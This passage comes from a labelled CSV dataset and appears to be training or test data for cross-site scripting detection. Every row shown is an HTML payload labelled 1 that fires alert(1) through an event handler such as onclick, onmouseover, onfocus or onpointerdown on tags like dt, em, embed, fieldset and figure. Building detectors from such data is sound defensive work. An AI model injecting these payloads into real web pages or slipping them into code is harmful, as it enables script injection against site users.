,Sentence,Label
1916,"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>
",1
1917,"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>
",1
1918,"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>
",1
1919,"<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>
",1
1920,"<dt onclick=""alert(1)"">test</dt>
",1
1921,"<dt oncontextmenu=""alert(1)"">test</dt>
",1
1922,"<dt oncopy=""alert(1)"" contenteditable>test</dt>
",1
1923,"<dt oncut=""alert(1)"" contenteditable>test</dt>
",1
1924,"<dt ondblclick=""alert(1)"">test</dt>
",1
1925,"<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>
",1
1926,"<dt onkeydown=""alert(1)"" contenteditable>test</dt>
",1
1927,"<dt onkeypress=""alert(1)"" contenteditable>test</dt>
",1
1928,"<dt onkeyup=""alert(1)"" contenteditable>test</dt>
",1
1929,"<dt onmousedown=""alert(1)"">test</dt>
",1
1930,"<dt onmouseenter=""alert(1)"">test</dt>
",1
1931,"<dt onmouseleave=""alert(1)"">test</dt>
",1
1932,"<dt onmousemove=""alert(1)"">test</dt>
",1
1933,"<dt onmouseout=""alert(1)"">test</dt>
",1
1934,"<dt onmouseover=""alert(1)"">test</dt>
",1
1935,"<dt onmouseup=""alert(1)"">test</dt>
",1
1936,"<dt onpaste=""alert(1)"" contenteditable>test</dt>
",1
1937,"<dt onpointerdown=alert(1)>XSS</dt>
",1
1938,"<dt onpointerenter=alert(1)>XSS</dt>
",1
1939,"<dt onpointerleave=alert(1)>XSS</dt>
",1
1940,"<dt onpointermove=alert(1)>XSS</dt>
",1
1941,"<dt onpointerout=alert(1)>XSS</dt>
",1
1942,"<dt onpointerover=alert(1)>XSS</dt>
",1
1943,"<dt onpointerup=alert(1)>XSS</dt>
",1
1944,"<element draggable=""true"" ondrag=""alert(1)"">test</element>
",1
1945,"<element draggable=""true"" ondragend=""alert(1)"">test</element>
",1
1946,"<element draggable=""true"" ondragenter=""alert(1)"">test</element>
",1
1947,"<element draggable=""true"" ondragleave=""alert(1)"">test</element>
",1
1948,"<element draggable=""true"" ondragstart=""alert(1)"">test</element>
",1
1949,"<element id=x tabindex=1 onactivate=alert(1)></element>
",1
1950,"<element id=x tabindex=1 onbeforeactivate=alert(1)></element>
",1
1951,"<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>
",1
1952,"<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>
",1
1953,"<element id=x tabindex=1 onfocus=alert(1)></element>
",1
1954,"<element id=x tabindex=1 onfocusin=alert(1)></element>
",1
1955,"<element onbeforecopy=""alert(1)"" contenteditable>test</element>
",1
1956,"<element onbeforecut=""alert(1)"" contenteditable>test</element>
",1
1957,"<element onbeforepaste=""alert(1)"" contenteditable>test</element>
",1
1958,"<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>
",1
1959,"<element onclick=""alert(1)"">test</element>
",1
1960,"<element oncontextmenu=""alert(1)"">test</element>
",1
1961,"<element oncopy=""alert(1)"" contenteditable>test</element>
",1
1962,"<element oncut=""alert(1)"" contenteditable>test</element>
",1
1963,"<element ondblclick=""alert(1)"">test</element>
",1
1964,"<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
",1
1965,"<element onkeydown=""alert(1)"" contenteditable>test</element>
",1
1966,"<element onkeypress=""alert(1)"" contenteditable>test</element>
",1
1967,"<element onkeyup=""alert(1)"" contenteditable>test</element>
",1
1968,"<element onmousedown=""alert(1)"">test</element>
",1
1969,"<element onmouseenter=""alert(1)"">test</element>
",1
1970,"<element onmouseleave=""alert(1)"">test</element>
",1
1971,"<element onmousemove=""alert(1)"">test</element>
",1
1972,"<element onmouseout=""alert(1)"">test</element>
",1
1973,"<element onmouseover=""alert(1)"">test</element>
",1
1974,"<element onmouseup=""alert(1)"">test</element>
",1
1975,"<element onpaste=""alert(1)"" contenteditable>test</element>
",1
1976,"<element onpointerdown=alert(1)>XSS</element>
",1
1977,"<element onpointerenter=alert(1)>XSS</element>
",1
1978,"<element onpointerleave=alert(1)>XSS</element>
",1
1979,"<element onpointermove=alert(1)>XSS</element>
",1
1980,"<element onpointerout=alert(1)>XSS</element>
",1
1981,"<element onpointerover=alert(1)>XSS</element>
",1
1982,"<element onpointerup=alert(1)>XSS</element>
",1
1983,"<em draggable=""true"" ondrag=""alert(1)"">test</em>
",1
1984,"<em draggable=""true"" ondragend=""alert(1)"">test</em>
",1
1985,"<em draggable=""true"" ondragenter=""alert(1)"">test</em>
",1
1986,"<em draggable=""true"" ondragleave=""alert(1)"">test</em>
",1
1987,"<em draggable=""true"" ondragstart=""alert(1)"">test</em>
",1
1988,"<em id=x tabindex=1 onactivate=alert(1)></em>
",1
1989,"<em id=x tabindex=1 onbeforeactivate=alert(1)></em>
",1
1990,"<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>
",1
1991,"<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>
",1
1992,"<em id=x tabindex=1 onfocus=alert(1)></em>
",1
1993,"<em id=x tabindex=1 onfocusin=alert(1)></em>
",1
1994,"<em onbeforecopy=""alert(1)"" contenteditable>test</em>
",1
1995,"<em onbeforecut=""alert(1)"" contenteditable>test</em>
",1
1996,"<em onbeforepaste=""alert(1)"" contenteditable>test</em>
",1
1997,"<em onblur=alert(1) tabindex=1 id=x></em><input autofocus>
",1
1998,"<em onclick=""alert(1)"">test</em>
",1
1999,"<em oncontextmenu=""alert(1)"">test</em>
",1
2000,"<em oncopy=""alert(1)"" contenteditable>test</em>
",1
2001,"<em oncut=""alert(1)"" contenteditable>test</em>
",1
2002,"<em ondblclick=""alert(1)"">test</em>
",1
2003,"<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>
",1
2004,"<em onkeydown=""alert(1)"" contenteditable>test</em>
",1
2005,"<em onkeypress=""alert(1)"" contenteditable>test</em>
",1
2006,"<em onkeyup=""alert(1)"" contenteditable>test</em>
",1
2007,"<em onmousedown=""alert(1)"">test</em>
",1
2008,"<em onmouseenter=""alert(1)"">test</em>
",1
2009,"<em onmouseleave=""alert(1)"">test</em>
",1
2010,"<em onmousemove=""alert(1)"">test</em>
",1
2011,"<em onmouseout=""alert(1)"">test</em>
",1
2012,"<em onmouseover=""alert(1)"">test</em>
",1
2013,"<em onmouseup=""alert(1)"">test</em>
",1
2014,"<em onpaste=""alert(1)"" contenteditable>test</em>
",1
2015,"<em onpointerdown=alert(1)>XSS</em>
",1
2016,"<em onpointerenter=alert(1)>XSS</em>
",1
2017,"<em onpointerleave=alert(1)>XSS</em>
",1
2018,"<em onpointermove=alert(1)>XSS</em>
",1
2019,"<em onpointerout=alert(1)>XSS</em>
",1
2020,"<em onpointerover=alert(1)>XSS</em>
",1
2021,"<em onpointerup=alert(1)>XSS</em>
",1
2022,"<embed draggable=""true"" ondrag=""alert(1)"">test</embed>
",1
2023,"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>
",1
2024,"<embed draggable=""true"" ondragenter=""alert(1)"">test</embed>
",1
2025,"<embed draggable=""true"" ondragleave=""alert(1)"">test</embed>
",1
2026,"<embed draggable=""true"" ondragstart=""alert(1)"">test</embed>
",1
2027,"<embed id=x onfocus=alert(1) type=text/html>
",1
2028,"<embed id=x onfocusin=alert(1) type=text/html>
",1
2029,"<embed id=x tabindex=1 onactivate=alert(1)></embed>
",1
2030,"<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>
",1
2031,"<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>
",1
2032,"<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>
",1
2033,"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>
",1
2034,"<embed onbeforecut=""alert(1)"" contenteditable>test</embed>
",1
2035,"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>
",1
2036,"<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>
",1
2037,"<embed onclick=""alert(1)"">test</embed>
",1
2038,"<embed oncontextmenu=""alert(1)"">test</embed>
",1
2039,"<embed oncopy=""alert(1)"" contenteditable>test</embed>
",1
2040,"<embed oncut=""alert(1)"" contenteditable>test</embed>
",1
2041,"<embed ondblclick=""alert(1)"">test</embed>
",1
2042,"<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>
",1
2043,"<embed onkeydown=""alert(1)"" contenteditable>test</embed>
",1
2044,"<embed onkeypress=""alert(1)"" contenteditable>test</embed>
",1
2045,"<embed onkeyup=""alert(1)"" contenteditable>test</embed>
",1
2046,"<embed onmousedown=""alert(1)"">test</embed>
",1
2047,"<embed onmouseenter=""alert(1)"">test</embed>
",1
2048,"<embed onmouseleave=""alert(1)"">test</embed>
",1
2049,"<embed onmousemove=""alert(1)"">test</embed>
",1
2050,"<embed onmouseout=""alert(1)"">test</embed>
",1
2051,"<embed onmouseover=""alert(1)"">test</embed>
",1
2052,"<embed onmouseup=""alert(1)"">test</embed>
",1
2053,"<embed onpaste=""alert(1)"" contenteditable>test</embed>
",1
2054,"<embed onpointerdown=alert(1)>XSS</embed>
",1
2055,"<embed onpointerenter=alert(1)>XSS</embed>
",1
2056,"<embed onpointerleave=alert(1)>XSS</embed>
",1
2057,"<embed onpointermove=alert(1)>XSS</embed>
",1
2058,"<embed onpointerout=alert(1)>XSS</embed>
",1
2059,"<embed onpointerover=alert(1)>XSS</embed>
",1
2060,"<embed onpointerup=alert(1)>XSS</embed>
",1
2061,"<embed src=/ onload=alert(1)>
",1
2062,"<embed src=1 onerror=alert(1) type=image/gif>
",1
2063,"<fieldset draggable=""true"" ondrag=""alert(1)"">test</fieldset>
",1
2064,"<fieldset draggable=""true"" ondragend=""alert(1)"">test</fieldset>
",1
2065,"<fieldset draggable=""true"" ondragenter=""alert(1)"">test</fieldset>
",1
2066,"<fieldset draggable=""true"" ondragleave=""alert(1)"">test</fieldset>
",1
2067,"<fieldset draggable=""true"" ondragstart=""alert(1)"">test</fieldset>
",1
2068,"<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>
",1
2069,"<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>
",1
2070,"<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>
",1
2071,"<fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>
",1
2072,"<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
",1
2073,"<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
",1
2074,"<fieldset onbeforecopy=""alert(1)"" contenteditable>test</fieldset>
",1
2075,"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>
",1
2076,"<fieldset onbeforepaste=""alert(1)"" contenteditable>test</fieldset>
",1
2077,"<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
",1
2078,"<fieldset onclick=""alert(1)"">test</fieldset>
",1
2079,"<fieldset oncontextmenu=""alert(1)"">test</fieldset>
",1
2080,"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>
",1
2081,"<fieldset oncut=""alert(1)"" contenteditable>test</fieldset>
",1
2082,"<fieldset ondblclick=""alert(1)"">test</fieldset>
",1
2083,"<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>
",1
2084,"<fieldset onkeydown=""alert(1)"" contenteditable>test</fieldset>
",1
2085,"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>
",1
2086,"<fieldset onkeyup=""alert(1)"" contenteditable>test</fieldset>
",1
2087,"<fieldset onmousedown=""alert(1)"">test</fieldset>
",1
2088,"<fieldset onmouseenter=""alert(1)"">test</fieldset>
",1
2089,"<fieldset onmouseleave=""alert(1)"">test</fieldset>
",1
2090,"<fieldset onmousemove=""alert(1)"">test</fieldset>
",1
2091,"<fieldset onmouseout=""alert(1)"">test</fieldset>
",1
2092,"<fieldset onmouseover=""alert(1)"">test</fieldset>
",1
2093,"<fieldset onmouseup=""alert(1)"">test</fieldset>
",1
2094,"<fieldset onpaste=""alert(1)"" contenteditable>test</fieldset>
",1
2095,"<fieldset onpointerdown=alert(1)>XSS</fieldset>
",1
2096,"<fieldset onpointerenter=alert(1)>XSS</fieldset>
",1
2097,"<fieldset onpointerleave=alert(1)>XSS</fieldset>
",1
2098,"<fieldset onpointermove=alert(1)>XSS</fieldset>
",1
2099,"<fieldset onpointerout=alert(1)>XSS</fieldset>
",1
2100,"<fieldset onpointerover=alert(1)>XSS</fieldset>
",1
2101,"<fieldset onpointerup=alert(1)>XSS</fieldset>
",1
2102,"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>
",1
2103,"<figcaption draggable=""true"" ondragend=""alert(1)"">test</figcaption>
",1
2104,"<figcaption draggable=""true"" ondragenter=""alert(1)"">test</figcaption>
",1
2105,"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>
",1
2106,"<figcaption draggable=""true"" ondragstart=""alert(1)"">test</figcaption>
",1
2107,"<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>
",1
2108,"<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>
",1
2109,"<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>
",1
2110,"<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>
",1
2111,"<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
",1
2112,"<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
",1
2113,"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>
",1
2114,"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>
",1
2115,"<figcaption onbeforepaste=""alert(1)"" contenteditable>test</figcaption>
",1
2116,"<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>
",1
2117,"<figcaption onclick=""alert(1)"">test</figcaption>
",1
2118,"<figcaption oncontextmenu=""alert(1)"">test</figcaption>
",1
2119,"<figcaption oncopy=""alert(1)"" contenteditable>test</figcaption>
",1
2120,"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>
",1
2121,"<figcaption ondblclick=""alert(1)"">test</figcaption>
",1
2122,"<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
",1
2123,"<figcaption onkeydown=""alert(1)"" contenteditable>test</figcaption>
",1
2124,"<figcaption onkeypress=""alert(1)"" contenteditable>test</figcaption>
",1
2125,"<figcaption onkeyup=""alert(1)"" contenteditable>test</figcaption>
",1
2126,"<figcaption onmousedown=""alert(1)"">test</figcaption>
",1
2127,"<figcaption onmouseenter=""alert(1)"">test</figcaption>
",1
2128,"<figcaption onmouseleave=""alert(1)"">test</figcaption>
",1
2129,"<figcaption onmousemove=""alert(1)"">test</figcaption>
",1
2130,"<figcaption onmouseout=""alert(1)"">test</figcaption>
",1
2131,"<figcaption onmouseover=""alert(1)"">test</figcaption>
",1
2132,"<figcaption onmouseup=""alert(1)"">test</figcaption>
",1
2133,"<figcaption onpaste=""alert(1)"" contenteditable>test</figcaption>
",1
2134,"<figcaption onpointerdown=alert(1)>XSS</figcaption>
",1
2135,"<figcaption onpointerenter=alert(1)>XSS</figcaption>
",1
2136,"<figcaption onpointerleave=alert(1)>XSS</figcaption>
",1
2137,"<figcaption onpointermove=alert(1)>XSS</figcaption>
",1
2138,"<figcaption onpointerout=alert(1)>XSS</figcaption>
",1
2139,"<figcaption onpointerover=alert(1)>XSS</figcaption>
",1
2140,"<figcaption onpointerup=alert(1)>XSS</figcaption>
",1
2141,"<figure draggable=""true"" ondrag=""alert(1)"">test</figure>
",1
2142,"<figure draggable=""true"" ondragend=""alert(1)"">test</figure>
",1
2143,"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>
",1
2144,"<figure draggable=""true"" ondragleave=""alert(1)"">test</figure>
",1
2145,"<figure draggable=""true"" ondragstart=""alert(1)"">test</figure>
",1
2146,"<figure id=x tabindex=1 onactivate=alert(1)></figure>
",1
2147,"<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>
",1
2148,"<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>
",1
2149,"<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
",1
2150,"<figure id=x tabindex=1 onfocus=alert(1)></figure>
",1
2151,"<figure id=x tabindex=1 onfocusin=alert(1)></figure>
",1
2152,"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>
",1
2153,"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>
",1
2154,"<figure onbeforepaste=""alert(1)"" contenteditable>test</figure>
",1
2155,"<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
",1
